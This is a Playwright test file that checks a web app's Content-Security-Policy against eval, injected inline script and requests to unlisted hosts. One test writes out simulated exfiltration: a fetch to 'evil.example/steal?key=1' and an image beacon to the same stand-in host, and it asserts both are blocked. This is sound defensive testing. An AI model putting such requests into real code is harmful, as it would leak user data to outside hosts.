import { expect, test, type Page } from "@playwright/test";

// The Content-Security-Policy only exists in the production build (the dev
// server needs an inline script for hot reload), so these run against
// `vite preview` on port 4173.
test.use({ baseURL: "http://localhost:4173" });

interface Violation {
  directive: string;
  /** What was blocked: a URL, or a keyword such as "eval" or "inline". */
  blocked: string;
}

/** The hostname of a blocked URL, or null when what was blocked isn't a URL ("eval", "inline"). */
function hostOf(blocked: string): string | null {
  try {
    return new URL(blocked).hostname;
  } catch {
    return null;
  }
}

/**
 * Records every policy violation the page reports. The list lives in the test
 * process, not on `window`, so a page reload can't erase what was already blocked.
 */
async function recordViolations(page: Page): Promise<() => Violation[]> {
  const seen: Violation[] = [];
  await page.exposeFunction("__reportViolation", (violation: Violation) => seen.push(violation));
  await page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (e) => {
      (
        window as unknown as { __reportViolation: (violation: Violation) => void }
      ).__reportViolation({ directive: e.violatedDirective, blocked: e.blockedURI });
    });
  });
  return () => seen;
}

test("the production page ships the policy", async ({ page }) => {
  await page.goto("/");
  const policy = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  expect(policy).toContain("script-src 'self' https://accounts.google.com/gsi/client");
  expect(policy).not.toContain("unsafe-inline");
});

test("a normal session through every screen triggers no violations", async ({ page }) => {
  const pageErrors: string[] = [];
  page.on("pageerror", (err) => pageErrors.push(err.message));
  const violations = await recordViolations(page);

  await page.goto("/");
  await expect(page.locator("#app_root")).toBeVisible();

  await page.locator("#nav_btn_manual").click();
  await page.locator("#manual_form_title_input").fill("CSP course");
  await page.locator("#manual_form_topic_input").fill("Testing");
  await page
    .getByPlaceholder("Step title (e.g. Setting up Vite & TS compiler)")
    .first()
    .fill("Step one");
  await page
    .getByPlaceholder(/Material URL/)
    .first()
    .fill("https://youtu.be/dQw4w9WgXcQ");
  await page.locator("#manual_form_submit_btn").click();
  await expect(page.locator("#view_study")).toBeVisible();

  await page.locator("#toggle_step_completed_desk_btn").click();
  await page.locator("#desk_add_step_btn").click();
  await expect(page.getByRole("dialog", { name: "Add Study Step" })).toBeVisible();
  await page.keyboard.press("Escape");

  await page.locator("#nav_btn_calendar").click();
  await expect(page.locator("#view_calendar")).toBeVisible();
  await page.locator("#nav_btn_analytics").click();
  await expect(page.locator("#view_analytics")).toBeVisible();
  await page.locator("#nav_btn_dashboard").click();

  await page.locator("#nav_btn_settings").click();
  await expect(page.getByRole("dialog", { name: "Settings" })).toBeVisible();
  await page.keyboard.press("Escape");

  await page.reload();
  await expect(page.locator("#header_course_selector")).toContainText("CSP course");

  expect(violations()).toEqual([]);
  expect(pageErrors).toEqual([]);
});

test("the policy blocks eval, injected script and requests to unlisted hosts, but not the allowed ones", async ({
  page,
}) => {
  const violations = await recordViolations(page);
  // Code run through page.evaluate is exempt from the policy (it goes through the
  // debugger protocol), so eval is tried from a script the page itself loads.
  await page.route("**/__probe.js", (route) =>
    route.fulfill({
      contentType: "text/javascript",
      body: 'try { eval("window.eval_ran = true"); } catch (e) { window.eval_error = e.name; }',
    }),
  );
  await page.goto("/");
  await expect(page.locator("#app_root")).toBeVisible();

  await page.evaluate(
    () =>
      new Promise<void>((resolve) => {
        const probe = document.createElement("script");
        probe.src = "/__probe.js";
        probe.onload = () => resolve();
        probe.onerror = () => resolve();
        document.head.appendChild(probe);
      }),
  );

  const outcome = await page.evaluate(async () => {
    const inline = document.createElement("script");
    inline.textContent = "window.inline_ran = true";
    document.head.appendChild(inline);

    let exfiltration = "allowed";
    try {
      await fetch("https://evil.example/steal?key=1");
    } catch {
      exfiltration = "blocked";
    }

    const img = new Image();
    img.src = "https://evil.example/pixel.png";

    // An allowed host may still fail on the network, but never as a policy violation.
    await fetch("https://api.anthropic.com/v1/messages").catch(() => undefined);

    await new Promise((resolve) => setTimeout(resolve, 300));
    return {
      evalError: window.eval_error ?? null,
      evalRan: window.eval_ran === true,
      inlineRan: window.inline_ran === true,
      exfiltration,
    };
  });

  expect(outcome).toEqual({
    evalError: "EvalError",
    evalRan: false,
    inlineRan: false,
    exfiltration: "blocked",
  });
  const seen = violations();
  expect(seen).toContainEqual({ directive: "script-src", blocked: "eval" });
  expect(seen).toContainEqual({ directive: "script-src-elem", blocked: "inline" });
  expect(
    seen.some((v) => v.directive === "connect-src" && hostOf(v.blocked) === "evil.example"),
  ).toBe(true);
  expect(seen.some((v) => v.directive === "img-src" && hostOf(v.blocked) === "evil.example")).toBe(
    true,
  );
  // An allowed host may still fail on the network, but never as a policy violation.
  expect(seen.filter((v) => hostOf(v.blocked) === "api.anthropic.com")).toEqual([]);
});

declare global {
  interface Window {
    eval_ran?: boolean;
    eval_error?: string;
    inline_ran?: boolean;
  }
}
